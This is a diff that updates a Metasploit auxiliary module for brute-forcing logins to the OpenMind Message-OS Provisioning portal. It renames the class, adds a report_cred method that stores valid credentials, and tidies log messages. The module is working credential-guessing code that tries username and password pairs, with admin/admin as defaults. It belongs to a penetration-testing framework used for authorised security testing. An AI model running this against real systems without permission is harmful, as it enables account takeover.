@@ -1,12 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::HttpClient
   include Msf::Auxiliary::Report
   include Msf::Auxiliary::AuthBrute
@@ -33,7 +30,7 @@ class Metasploit3 < Msf::Auxiliary
         OptString.new('TARGETURI', [true, "URI for Web login", "/provision/index.php"]),
         OptString.new('USERNAME', [true, "A specific username to authenticate as", "admin"]),
         OptString.new('PASSWORD', [true, "A specific password to authenticate with", "admin"])
-      ], self.class)
+      ])
   end
 
   def run_host(ip)
@@ -41,7 +38,7 @@ class Metasploit3 < Msf::Auxiliary
       return
     end
 
-    print_status("#{peer} - Starting login brute force...")
+    print_status("Starting login brute force...")
     each_user_pass do |user, pass|
       do_login(user, pass)
     end
@@ -59,17 +56,43 @@ class Metasploit3 < Msf::Auxiliary
         'method'    => 'GET'
       })
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
-      vprint_error("#{peer} - HTTP Connection Failed...")
+      vprint_error("HTTP Connection Failed...")
       return false
     end
 
     if (res and res.code == 302 and res.headers['Location'] and res.headers['Location'].include?("/provision/index.php"))
-      vprint_good("#{peer} - Running OpenMind Message-OS Provisioning portal...")
+      vprint_good("Running OpenMind Message-OS Provisioning portal...")
       return true
     else
-      vprint_error("#{peer} - Application is not OpenMind. Module will not continue.")
+      vprint_error("Application is not OpenMind. Module will not continue.")
       return false
     end
+  end
+
+  def report_cred(opts)
+    service_data = {
+      address: opts[:ip],
+      port: opts[:port],
+      service_name: opts[:service_name],
+      protocol: 'tcp',
+      workspace_id: myworkspace_id
+    }
+
+    credential_data = {
+      origin_type: :service,
+      module_fullname: fullname,
+      username: opts[:user],
+      private_data: opts[:password],
+      private_type: :password
+    }.merge(service_data)
+
+    login_data = {
+      core: create_credential(credential_data),
+      status: Metasploit::Model::Login::Status::SUCCESSFUL,
+      proof: opts[:proof]
+    }.merge(service_data)
+
+    create_credential_login(login_data)
   end
 
   #
@@ -77,7 +100,7 @@ class Metasploit3 < Msf::Auxiliary
   #
 
   def do_login(user, pass)
-    vprint_status("#{peer} - Trying username:#{user.inspect} with password:#{pass.inspect}")
+    vprint_status("Trying username:#{user.inspect} with password:#{pass.inspect}")
     begin
       res = send_request_cgi(
       {
@@ -90,25 +113,23 @@ class Metasploit3 < Msf::Auxiliary
           }
       })
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError, ::Errno::EPIPE
-      vprint_error("#{peer} - HTTP Connection Failed...")
+      vprint_error("HTTP Connection Failed...")
       return :abort
     end
 
     if (res and res.code == 302 and res.headers['Location'].include?("frameset"))
-      print_good("#{peer} - SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
-      report_hash = {
-        :host   => rhost,
-        :port   => rport,
-        :sname  => 'OpenMind Message-OS Provisioning Portal',
-        :user   => user,
-        :pass   => pass,
-        :active => true,
-        :type => 'password'
-      }
-      report_auth_info(report_hash)
+      print_good("SUCCESSFUL LOGIN - #{user.inspect}:#{pass.inspect}")
+      report_cred(
+        ip: rhost,
+        port: rport,
+        service_name: 'OpenMind Message-OS Provisioning Portal',
+        user: user,
+        password: pass,
+        proof: res.headers['Location']
+      )
       return :next_user
     else
-      vprint_error("#{peer} - FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
+      vprint_error("FAILED LOGIN - #{user.inspect}:#{pass.inspect}")
     end
 
   end
